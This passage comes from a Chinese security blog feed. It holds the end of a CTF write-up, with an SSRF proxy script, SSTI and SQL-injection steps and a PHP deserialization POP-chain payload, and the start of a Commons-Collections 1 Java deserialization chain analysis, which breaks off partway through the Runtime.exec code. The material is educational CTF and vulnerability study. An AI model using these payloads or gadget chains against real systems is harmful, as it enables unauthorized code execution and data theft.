class="string">&quot;No response&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;JSON decode error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>, response.text <span class="keyword">if</span> <span class="string">&#x27;response&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>() <span class="keyword">else</span> <span class="string">&quot;No response&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Key error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>, response.text <span class="keyword">if</span> <span class="string">&#x27;response&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>() <span class="keyword">else</span> <span class="string">&quot;No response&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Unexpected error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>, response.text <span class="keyword">if</span> <span class="string">&#x27;response&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>() <span class="keyword">else</span> <span class="string">&quot;No response&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>这里的话加一个代理，使得每次发包的流量都经过bp，方便后续查看状态。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038957.png" alt="image-20241103214907887"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038965.png" alt="image-20241103214136787"></p><p>这里跑的话要多跑几次。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038020.png" alt="image-20241103214931885"></p><p>可以看到赢得比赛之后出现一个路由 我们去访问。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038997.png" alt="image-20241103215007722"></p><p>经过测试发现这是一个sql注入。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038104.png" alt="image-20241103215112767"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038386.png" alt="image-20241103215058598"></p><p>这里字段很明显了，就是三，也就是time这个字段，但是数据库也没爆出来。</p><p>后面测试发现这就是一个ssti.</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038786.png" alt="image-20241103215458923"></p><p>这里的话 记得用url编码一下</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038793.png" alt="image-20241103215602542"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038848.png" alt="image-20241103215628739"></p><h1 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h1><p>审计源码发现通过&#x2F;v2&#x2F;api&#x2F;proxy访问&#x2F;v1&#x2F;api&#x2F;flag就行，但是从proxy.conf中发现需要访问<a class="link" href="http://localhost:8769/v1/api/flag">http://localhost:8769/v1/api/flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038802.png" alt="image-20241103102724680"></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag_via_proxy</span>():</span><br><span class="line">    <span class="comment"># 定义代理请求的 URL</span></span><br><span class="line">    proxy_url = <span class="string">&quot;http://47.94.226.70:36891/v2/api/proxy&quot;</span>  <span class="comment"># 替换为你的代理服务器地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义请求头</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置请求数据，通过 /v2/api/proxy 访问 /v1/api/flag</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://localhost:8769/v1/api/flag&quot;</span>,  <span class="comment"># 代理到 localhost:8769</span></span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,  <span class="comment"># 确保使用正确的请求方法</span></span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># 如果需要请求体，填入相应内容</span></span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">            <span class="comment"># 添加其他必要的请求头，例如身份验证头</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;follow_redirects&quot;</span>: <span class="literal">False</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送请求到代理端点</span></span><br><span class="line">        response = requests.post(proxy_url, headers=headers, data=json.dumps(data))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查响应状态码</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="comment"># 提取并打印 flag</span></span><br><span class="line">            flag = response.json().get(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(flag, <span class="built_in">bytes</span>) <span class="keyword">else</span> flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error: Received status code <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Response:&quot;</span>, response.text)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Request failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行脚本</span></span><br><span class="line">get_flag_via_proxy()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038798.png" alt="image-20241103102831848"></p><p>base64解码得到flag</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038261.png" alt="image-20241103102846517"></p><h1 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h1><p>在game.php这个地方进行抓包，来满足3条规则。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038510.png" alt="image-20241103182838531"></p><p>这个满足三条规则即可。</p><p>满足条件之后就会输出一段反序列化的代码。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038665.png" alt="image-20241103183324307"></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>flag是全局变量，需要将其echo出来。</p><p>整体思路就是利用引用，在root类里面定义一个不存在的属性，然后将其和user里面的value进行引用 触发get魔术方法。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038548.png" alt="image-20241103185702410"></p><p>这个地方会echo出username，也就是$this-&gt;value &#x3D; $GLOBALS[“flag”]; 这个地方。</p><p>先在本地测试一下：</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038630.png" alt="image-20241103190111605"></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username = <span class="string">&quot;qwb&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="number">2024</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fs = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fs -&gt;username = &amp;<span class="variable">$a</span>-&gt;value;</span><br><span class="line"><span class="variable">$a</span>-&gt;fs -&gt;password = <span class="string">&quot;Aa123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:4:&quot;root&quot;:3:&#123;s:8:&quot;username&quot;;s:3:&quot;qwb&quot;;s:2:&quot;fs&quot;;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;i:2024;s:8:&quot;password&quot;;s:5:&quot;Aa123&quot;;s:5:&quot;value&quot;;N;&#125;s:5:&quot;value&quot;;R:4;&#125;</span></span><br></pre></td></tr></table></figure></div><p>发现是可以的。</p><p>后面反序列化的数字总和仍然需要满足那三个规则，这里改的话主要是改password，慢慢计算即可。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038714.png" alt="image-20241103190450800"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038077.png" alt="image-20241103190655532"></p><p>最后那个地方得满足前两个条件。</p><p>这里修改一下。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038205.png" alt="image-20241103190820703"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038125.png" alt="image-20241103190958516"></p><p>​              </p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 1利用链分析</title>
    <link href="http://example.com/2024/08/30/Java%E5%AE%89%E5%85%A8-Commons-Collections-1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/08/30/Java%E5%AE%89%E5%85%A8-Commons-Collections-1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-08-30T15:28:35.000Z</published>
    <updated>2025-01-22T06:37:07.067Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><a class="link" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">JDK8u65 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>Maven3.6.3</li></ul><p>将jdk-af660750b2f4\src\share\classes\sun复制到jdk1.8.0_65\src</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329596.png" alt="QQ_1722596207037"></p><p>新建项目，将JDK换成8u65</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329071.png" alt="QQ_1724122490726"></p><p>然后在pom.xml添加依赖</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329631.png" alt="QQ_1722598348232"></p><p>项目结构-&gt;SDK</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329404.png" alt="QQ_1722604414421"></p><p>然后</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329882.png" alt="QQ_1722599053594"></p><p>通过import CC的包来验证环境是否导入成功</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br></pre></td></tr></table></figure></div><h1 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common-Collections"></a>Common-Collections</h1><p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成:<code>Proper</code>(一些已发布项目)，<code>Sandbox</code>(一些正在开发的项目)和<code>Dormant</code>(一些刚启动或者已经停止维护的项目)。</p><blockquote><p>简单来说，Common-Collections这个项目开发出来是为了给Java标准的Collections API提供了相当好的补充</p><p>在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充</p></blockquote><h2 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h2><ul><li><code>org.apache.commons.collections</code>-CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code>-实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code>-实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code>-实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code>-实现Java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>-实现Java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors-Commons Collections</code>-自定义的一组功能组</li><li><code>org.apache.commons.collections.iterators</code>-实现Java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code>-实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code>-实现java.util.list接口的一组类</li><li><code>org.apache.commons.collections.map</code>-实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code>-实现Set系列接口的一组类</li></ul><h1 id="TransformMap版CC1攻击链"><a href="#TransformMap版CC1攻击链" class="headerlink" title="TransformMap版CC1攻击链"></a>TransformMap版CC1攻击链</h1><p>反序列化攻击思路</p><p>入口类这里，需要一个<code>readObject</code>方法，结尾需要一个能够执行命令的方法，中间通过链子引导过去，所以攻击一定要从尾部出发取寻找头</p><p>流程图：</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329186.png" alt="QQ_1724120263339"></p><h2 id="寻找尾部的exec方法"><a href="#寻找尾部的exec方法" class="headerlink" title="寻找尾部的exec方法"></a>寻找尾部的exec方法</h2><p><code>Transfomer</code>接口，查看接口实现的类</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329605.png" alt="QQ_1724132888005"></p><p><code>InvokerTransformer</code>中存在反射可以调用任意类的任意方法，可以作为链子的终点</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329888.png" alt="QQ_1724133083887"></p><p>先尝试构造一下，利用这个类弹个计算器</p><p>反射的命令执行</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>根据构造方法构造exp，因为是public方法，无需反射</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329449.png" alt="QQ_1724133499724"></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title 